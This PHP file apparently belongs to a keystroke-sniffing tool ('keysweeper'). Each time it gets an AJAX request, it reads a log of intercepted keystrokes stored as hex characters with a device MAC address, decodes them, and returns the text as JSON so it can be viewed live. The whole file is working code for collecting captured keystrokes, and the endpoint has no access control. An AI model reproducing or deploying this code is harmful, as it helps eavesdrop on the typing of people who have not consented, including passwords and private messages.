<?php

$file = "/tmp/keysweeper.log";

if (is_ajax())
{
  $chars = "";
  $lastid = 0;
  $fh = fopen($file, "r") or die("Can't read log file");

  // if we have a specific id to read
  if (isset($_POST["id"]) && !empty($_POST["id"])) {
	while (($line = fgets($fh)) !== false)
	{
		$a = explode(" ", $line);
		$lastid = $a[0];
		// format is: id XX(char in hex) mac
		if ($a[0] > $_POST["id"])
			$chars .= pack('H2', $a[1]);
    }
  }
  else
  {
	while (($line = fgets($fh)) !== false)
	{
		$a = explode(" ", $line);
		$chars .= pack('H2', $a[1]);
		$lastid = $a[0];
	}
  }

  $ret["chars"] = $chars;
  $ret["lastid"] = $lastid;
  echo json_encode($ret);
}

function is_ajax()
{
  return isset($_SERVER['HTTP_X_REQUESTED_WITH']) && strtolower($_SERVER['HTTP_X_REQUESTED_WITH']) == 'xmlhttprequest';
}

?>
